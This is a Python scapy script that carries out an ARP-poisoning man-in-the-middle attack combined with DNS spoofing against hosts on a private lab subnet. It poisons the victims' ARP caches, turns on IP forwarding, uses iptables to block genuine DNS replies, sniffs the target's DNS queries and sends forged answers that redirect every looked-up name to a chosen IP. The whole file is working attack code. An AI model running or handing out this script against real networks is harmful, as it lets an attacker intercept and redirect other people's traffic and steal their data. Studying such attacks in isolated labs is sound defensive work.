import logging
import platform
import threading
import time
from subprocess import Popen, PIPE

from scapy.all import *
from scapy.layers.dns import DNS, DNSRR, DNSQR
from scapy.layers.inet import IP, UDP
from scapy.layers.inet6 import IPv6
from scapy.layers.l2 import ARP, getmacbyip, Ether
from scapy.sendrecv import sendp, send, sniff

# load_layer("tls")

host_ip = "192.168.56.103"
target_ip = "192.168.56.101"

host_mac = '08:00:27:d0:25:4b'

ip_to_spoof = '192.168.56.102'

targets = [{'ip': "192.168.56.101"},
           {'ip': '192.168.56.102'}]

logging.getLogger('scapy').setLevel(logging.WARNING)


def arp_poison_targets(victims, sleep=0):
    """
    Arp poison the list of victims to redirect traffic towards us
    :param sleep: time to sleep before exiting
    :param victims: list of ip addresses
    :return:
    """
    assert len(victims) >= 2, 'We must have at least 2 victims to poison'
    while True:
        for i in range(len(victims) - 1):
            for j in range(i + 1, len(victims)):
                print(i, j)
                # arp poison both ways
                arp_poisoning(victims[i], victims[j])
                arp_poisoning(victims[j], victims[i])
        if sleep > 1:
            time.sleep(sleep)
        else:
            break


def arp_poisoning(target, victim):
    """
    arp poisoning the target arp cache to redirect packets towards the host ip, instead of the victim
    :param target: ip of target to poison
    :param victim: ip of the victim to redirect
    :return:
    """
    if 'mac' not in target.keys():
        target['mac'] = getmacbyip(target['ip'])
    p = Ether(src=host_mac) / ARP(hwsrc=host_mac, psrc=victim['ip'], hwdst=target['mac'], pdst=target['ip'])
    sendp(p, iface='enp0s3', verbose=False)


# test

# arp_poisoning(target_ip, ip_to_spoof)

def mitm_attack(victims):
    """
    Setup continuous arp poisoning and redirect packets between victims via this host
    :param victims: list of ip addresses
    :return:
    """
    # start arp poisoning
    th = threading.Thread(target=arp_poison_targets, args=(victims,), kwargs={'sleep': 60})
    th.start()
    # arp_poison_targets(victims, sleep=60)
    print('Started, arp poisoning')
    dns_sniffer()

    return th


def dns_sniffer():
    """
    This function is responsible for sniffing for DNS packets and forwarding them to the spoofer.
    :return:
    """

    sniff(filter="udp and port 53 and host " + target_ip, prn=dns_spoofer)


def dns_spoofer(p):
    """
    This function is responsible for sending spoofed DNS responses to the target with the answer as the server address provided by us.
    :param p: the packet we received
    :return:
    """
    print(type(p))
    print(p.show())
    if not p.haslayer(IP):
        return

    if (p[IP].src == target_ip and
            p.haslayer(DNS) and
            p[DNS].qr == 0 and  # DNS Query
            p[DNS].opcode == 0 and  # DNS Standard Query
            p[DNS].ancount == 0  # Answer Count
    ):

        print("Sending spoofed DNS response")
        if p.haslayer(IPv6):
            ip_layer = IPv6(src=p[IPv6].dst, dst=p[IPv6].src)
        else:
            ip_layer = IP(src=p[IP].dst, dst=p[IP].src)

        # Create the spoofed DNS response (returning back our IP as answer instead of the endpoint)
        dns_resp = ip_layer / \
                   UDP(
                       dport=p[UDP].sport,
                       sport=53
                   ) / \
                   DNS(
                       id=p[DNS].id,  # Same as query
                       ancount=1,  # Number of answers
                       qr=1,  # DNS Response
                       ra=1,  # Recursion available
                       qd=(p.getlayer(DNS)).qd,  # Query Data
                       an=DNSRR(
                           rrname=p[DNSQR].qname,  # Queried host name
                           rdata=ip_to_spoof,  # IP address of queried host name
                           ttl=10
                       )
                   )

        # Send the spoofed DNS response
        print(dns_resp.show())
        send(dns_resp, verbose=0)
        print("Resolved DNS request for " + p[DNS].qd.qname + " by " + ip_to_spoof)


def set_local_settings():
    """
    Set local settings of the system to stop forwading ip messages
    :return:
    """
    # Check to see if we are on linux
    if platform.system() == "Linux":
        # Enable IP forwarding
        ipf = open('/proc/sys/net/ipv4/ip_forward', 'r+')
        ipf_read = ipf.read()
        if (ipf_read != '1\n'):
            ipf.write('1\n')
        ipf.close()

        # Disable DNS Query forwarding
        firewall = "iptables -A FORWARD -p UDP --dport 53 -j DROP"
        Popen([firewall], shell=True, stdout=PIPE)


def main():
    """Run the attack"""

    set_local_settings()
    threat = mitm_attack(targets)

    print('Attack is running')


main()
